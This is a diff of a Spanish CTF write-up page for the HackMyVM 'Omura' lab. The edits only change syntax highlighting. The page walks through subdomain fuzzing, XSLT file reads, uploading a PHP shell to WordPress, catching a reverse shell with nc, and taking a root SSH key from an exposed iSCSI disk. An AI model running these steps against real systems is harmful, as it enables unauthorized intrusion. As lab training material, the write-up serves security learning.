@@ -19,7 +19,9 @@
     <link rel="shortcut icon" href="../../assets/img/favicon.ico">
     
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
-    <link rel="stylesheet" href="../../assets/css/prism.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
+    <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
+    <script src="../../assets/highlight/highlight.min.js"></script>
     <link rel="stylesheet" href="../../assets/css/hmv_w.css">  
 </head>
 <body>
@@ -46,7 +48,7 @@ PORT     STATE SERVICE
 </code></pre>
             <h3>Escaneo de servicios</h3>
 <pre class="pre">
-<code class="language-txt">❯ nmap -sVC -v -p 22,80,3260 192.168.1.12
+<code class="code language-txt">❯ nmap -sVC -v -p 22,80,3260 192.168.1.12
 
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
@@ -73,10 +75,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
             <h3>Puerto 3260 protocolo iSCSI</h3>
             <p>iSCSI es un protocolo de red de área de almacenamiento que define cómo se transfieren los datos entre los sistemas host y los dispositivos de almacenamiento.</p>
             <h3>Enumeración de subdominios</h3>
-            <p>Agrego el dominio<code class="code_negrita">&nbsp;omura.hmv&nbsp;</code>mi archivo hosts y lanzo una enumeración de subdominios con<code class="code_negrita">&nbsp;wfuzz</code>.</p>
+            <p>Agrego el dominio<code class="code_negrita">&nbsp;omura.hmv&nbsp;</code>mi archivo hosts y lanzo una enumeración de subdominios con<code class="code_negrita">&nbsp;wfuzz&nbsp;</code>.</p>
             
            
-<pre class="pre"><code class="language-txt">❯ wfuzz -t 100 -c --hh=795 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.omura.hmv" http://omura.hmv
+<pre class="pre"><code class="code language-txt">❯ wfuzz -t 100 -c --hh=795 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.omura.hmv" http://omura.hmv
     
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
@@ -87,7 +89,7 @@ ID           Response   Lines    Word       Chars       Payload
             <p>Si navego al nuevo subdomino, veo un wordpress.</p>
             <img class="img_b" src="../../assets/img/hmv_omura/wordpress-omura.png" alt="wordpress-omura">
             <p>Hago fuerza bruta de directorios y extensiones con gobuster.</p>
-<pre class="pre"><code class="language-txt">❯ gobuster dir -u http://wordpress.omura.hmv/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
+<pre class="pre"><code class="code language-txt">❯ gobuster dir -u http://wordpress.omura.hmv/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
 
 /wp-content           (Status: 301) [Size: 331] [--> http://wordpress.omura.hmv/wp-content/]
 /index.php            (Status: 301) [Size: 0] [--> http://wordpress.omura.hmv/]
@@ -105,7 +107,7 @@ ID           Response   Lines    Word       Chars       Payload
             <p>Panel de login.</p>
             <img class="img_b" src="../../assets/img/hmv_omura/login-wordpress.png" alt="login-wordpress">
             <p>Después de hechar un vistazo general a hacktricks voy de nuevo al puerto 80.</p>
-<pre class="pre"><code class="language-txt">https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations
+<pre class="pre"><code class="code language-txt">https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations
 </code></pre>
             <h3>Archivo lfi.xsl</h3>
             <img class="img_b" src="../../assets/img/hmv_omura/alfixsl.png" alt="alfi">
@@ -117,10 +119,10 @@ ID           Response   Lines    Word       Chars       Payload
             <img class="img_b" src="../../assets/img/hmv_omura/saxon-lfi2.png" alt="saxon-lfi2">
             <p>Modifico el archivo lfi para ver el contenido de la carpeta wordpress.</p>
             <img class="img_b" src="../../assets/img/hmv_omura/saxon-lfi3.png" alt="saxon-lfi3">
-            <p>Dentro de la carpeta wordpress veo el archivo<code class="code_negrita">&nbsp;wp-config.php</code>.</p>
+            <p>Dentro de la carpeta wordpress veo el archivo<code class="code_negrita">&nbsp;wp-config.php&nbsp;</code>.</p>
             <img class="img_b" src="../../assets/img/hmv_omura/saxon-lfi4.png" alt="saxon-lfi4">
             <p>Para leer el archivo wp-config.</p>
-<pre class="pre"><code class="language-txt">https://gist.github.com/matthiaskaiser/4924336ba0bc1259d75b
+<pre class="pre"><code class="code language-txt">https://gist.github.com/matthiaskaiser/4924336ba0bc1259d75b
 </code></pre>
             
             <img class="img_b" src="../../assets/img/hmv_omura/aonexsl.png" alt="aonexsl">
@@ -137,11 +139,11 @@ ID           Response   Lines    Word       Chars       Payload
             <p>Verifico que se ha subido correctamente.</p>
             <img class="img_b" src="../../assets/img/hmv_omura/wp-content_shell.png" alt="wp-content_shell">
             <p>Lanzo curl para obtener la shell.</p>
-<pre class="pre"><code class="language-txt">❯ curl -s http://wordpress.omura.hmv/wp-content/uploads/2023/04/shell.php
+<pre class="pre"><code class="code language-txt">❯ curl -s http://wordpress.omura.hmv/wp-content/uploads/2023/04/shell.php
 </code></pre>
 
             <p>Obtengo la shell como usuario www-data.</p>
-<pre class="pre"><code class="language-txt">❯ nc -lvnp 1234
+<pre class="pre"><code class="code language-txt">❯ nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [192.168.1.16] from (UNKNOWN) [192.168.1.12] 54044
 bash: cannot set terminal process group (533): Inappropriate ioctl for device
@@ -154,21 +156,21 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
             <p>Con find busco todo lo relacionado con el servicio iscsi.</p>
 
-<pre class="pre"><code class="language-txt">www-data@omura:/uploads/2023/04$ find / -name "*iscsi*" 2>/dev/null          
+<pre class="pre"><code class="code language-txt">www-data@omura:/uploads/2023/04$ find / -name "*iscsi*" 2>/dev/null          
 /var/lib/iscsi_disks
 /sys/kernel/config/target/iscsi
 /sys/kernel/config/target/iscsi/iqn.2023-02.omura.hmv:target01/tpgt_1/acls/iqn.2023-02.omura.hmv:node01.initiator01/fabric_statistics/iscsi_ses
 </code></pre>
             <p>Obtengo la dirección iqn.</p>
-<pre class="pre"><code class="language-txt">iqn.2023-02.omura.hmv:node01.initiator01
+<pre class="pre"><code class="code language-txt">iqn.2023-02.omura.hmv:node01.initiator01
 </code></pre>
 
 
             <p>Instalo en mi máquina la herramienta open-iscsi.</p>
-<pre class="pre"><code class="language-txt">sudo apt install open-iscsi
+<pre class="pre"><code class="code language-txt">sudo apt install open-iscsi
 </code></pre>
             <p>Edito el archivo<code class="code_negrita">&nbsp;initiatorname.iscsi&nbsp;</code>y le añado la dirección encontrada.</p>
-<pre class="pre"><code class="language-txt">❯ sudo nano /etc/iscsi/initiatorname.iscsi
+<pre class="pre"><code class="code language-txt">❯ sudo nano /etc/iscsi/initiatorname.iscsi
 
 ## DO NOT EDIT OR REMOVE THIS FILE!
 ## If you remove this file, the iSCSI daemon will not start.
@@ -178,7 +180,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 InitiatorName=iqn.2023-02.omura.hmv:node01.initiator01
 </code></pre>
             <p>Edito el archivo<code class="code_negrita">&nbsp;iscsi.conf&nbsp;</code>y pongo el<code class="code_negrita">&nbsp;node.startup&nbsp;</code>en automático.</p>
-<pre class="pre"><code class="language-txt">❯ sudo nano /etc/iscsi/iscsid.conf
+<pre class="pre"><code class="code language-txt">❯ sudo nano /etc/iscsi/iscsid.conf
 #*****************
 # Startup settings
 #*****************
@@ -188,26 +190,26 @@ InitiatorName=iqn.2023-02.omura.hmv:node01.initiator01
 </code></pre>
 
             <p>Reinicio los servicios para que los cambios tengan efecto.</p>
-<pre class="pre"><code class="language-txt">❯ sudo systemctl restart iscsid open-iscsi
+<pre class="pre"><code class="code language-txt">❯ sudo systemctl restart iscsid open-iscsi
 </code></pre>
 
 
             <p>Identifico el objetivo compartido.</p>
-<pre class="pre"><code class="language-txt">❯ sudo iscsiadm -m discovery -t sendtargets -p 192.168.1.12
+<pre class="pre"><code class="code language-txt">❯ sudo iscsiadm -m discovery -t sendtargets -p 192.168.1.12
 192.168.1.12:3260,1 iqn.2023-02.omura.hmv:target01
 </code></pre>
 
             <p>Me conecto al servicio.</p>
-<pre class="pre"><code class="language-txt">❯ sudo iscsiadm -m node --login
+<pre class="pre"><code class="code language-txt">❯ sudo iscsiadm -m node --login
 </code></pre>
 
             <p>Verifico la conexión.</p>
-<pre class="pre"><code class="language-txt">❯ sudo iscsiadm -m session -o show
+<pre class="pre"><code class="code language-txt">❯ sudo iscsiadm -m session -o show
 tcp: [1] 192.168.1.12:3260,1 iqn.2023-02.omura.hmv:target01 (non-flash)
 </code></pre>
 
             <p>Con fdisk veo una nueva partición creada por el servicio iscsi.</p>
-<pre class="pre"><code class="language-txt">❯ sudo fdisk -l
+<pre class="pre"><code class="code language-txt">❯ sudo fdisk -l
 Disk /dev/sdb: 5 MiB, 5242880 bytes, 10240 sectors
 Disk model: disk01          
 Units: sectors of 1 * 512 = 512 bytes
@@ -216,20 +218,20 @@ I/O size (minimum/optimal): 512 bytes / 8388608 bytes
 </code></pre>
 
             <p>Creo la carpeta omura e<code class="code_negrita">&nbsp;/tmp&nbsp;</code>para montar la nueva partición.</p>
-<pre class="pre"><code class="language-txt">❯ mkdir /tmp/omura
+<pre class="pre"><code class="code language-txt">❯ mkdir /tmp/omura
 </code></pre>
 
             <p>Monto la nueva partición en omura.</p>
-<pre class="pre"><code class="language-txt">❯ sudo mount /dev/sdb /tmp/omura
+<pre class="pre"><code class="code language-txt">❯ sudo mount /dev/sdb /tmp/omura
 </code></pre>
 
             <p>Lanzo un ls a la carpeta omura y encuentro una llave rsa.</p>
-<pre class="pre"><code class="language-txt">❯ ls /tmp/omura
+<pre class="pre"><code class="code language-txt">❯ ls /tmp/omura
 id_rsa
 </code></pre>
 
             <p>Me conecto por ssh usando la llave rsa y obtengo el root.</p>
-<pre class="pre"><code class="language-txt">❯ ssh root@192.168.1.12 -i id_rsa
+<pre class="pre"><code class="code language-txt">❯ ssh root@192.168.1.12 -i id_rsa
 root@omura:~# id
 uid=0(root) gid=0(root) groupes=0(root)
 </code></pre>
@@ -239,7 +241,8 @@ uid=0(root) gid=0(root) groupes=0(root)
     </main>
         <footer class="footer">
             <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
-            <script src="../../assets/js/prism.js"></script> 
+            <script src="../../assets/highlight/highlight.min.js"></script>
+            <script>hljs.initHighlightingOnLoad();</script> 
 
         </footer>  
 </body>
